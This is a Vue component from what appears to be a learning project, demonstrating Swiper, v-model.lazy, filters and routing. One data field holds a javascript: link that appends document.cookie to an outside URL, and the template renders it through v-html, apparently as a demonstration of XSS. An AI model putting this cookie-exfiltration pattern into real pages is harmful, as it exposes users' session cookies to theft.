<template>
  <div class="search">
    {{ a }}
    <button @click="toHome">to Home</button>
    <button @click="toSearch">to Search</button>
    <br><br>
    <div class="swiper-container">
      <div class="swiper-wrapper">
        <div v-for="item in list" :key="item" class="swiper-slide">Slide {{ item }}</div>
      </div>
      <!-- 如果需要分页器 -->
      <div class="swiper-pagination"></div>
      
      <!-- 如果需要导航按钮 -->
      <div class="swiper-button-prev"></div>
      <div class="swiper-button-next"></div>
    </div>
    <br>
    <div>
      <h5 style="display: inline-block">v-model.lazy--光标失去更新数据：</h5>
      <input type="text" v-model.lazy="msg">
    </div>
    <h5>过滤器(默认参数)：{{ time | formatTime }}</h5>
    <h5>过滤器(传参)：{{ time | formatTime('YYYY-MM-DD') }}</h5>
    <h5>过滤器串联使用：{{ time | formatTime | sliceStr }}</h5>
    <span v-html="span"></span>
  </div>
</template>

<script>
import { getBaseCategoryList, getMockTestData } from '@/api'
getBaseCategoryList()
import Swiper from 'swiper'
import 'swiper/css/swiper.css'

export default {
  props: ['a'],
  data() {
    return {
      list: [],
      num: 1,
      msg: '',
      time: 1639124446679,
      span: '<a href="javascript:location.href="http://www.baidu.com?"+document.cookie">百度</a>'
    }
  },
  computed: {
  },
  filters: {
    sliceStr(str) {
      return str.slice(0,4)
    }
  },
  created() {
  },
  mounted() {
    setTimeout(() => {
      this.num++
    },2000)
    this.getMockTestData()
  },
  updated() {
  },
  methods: {
    toHome() {
      this.$router.push('/home')
    },
    toSearch() {
      // this.$router.push({ name: 'Search', params: { k: 123 }})
      // this.$router.push({ name: 'Search', query: { bbb: 1 }})
      this.$router.push('/search/1')
    },
    async getMockTestData() {
      await getMockTestData().then(res => {
        this.list = res.list
      })
      // https://www.swiper.com.cn/usage/index.html
      new Swiper('.swiper-container', {
        loop: true, // 循环模式选项
        // 如果需要分页器
        pagination: {
          el: '.swiper-pagination',
          clickable: true
        },
        // 如果需要前进后退按钮
        navigation: {
          nextEl: '.swiper-button-next',
          prevEl: '.swiper-button-prev',
        }
      })  
    }
  }
}
</script>

<style lang='less' scoped>
.search {
  width: 100%;
  .swiper-container {
    width: 600px;
    height: 300px;
    border: 1px solid lightblue;
  }
}
</style>
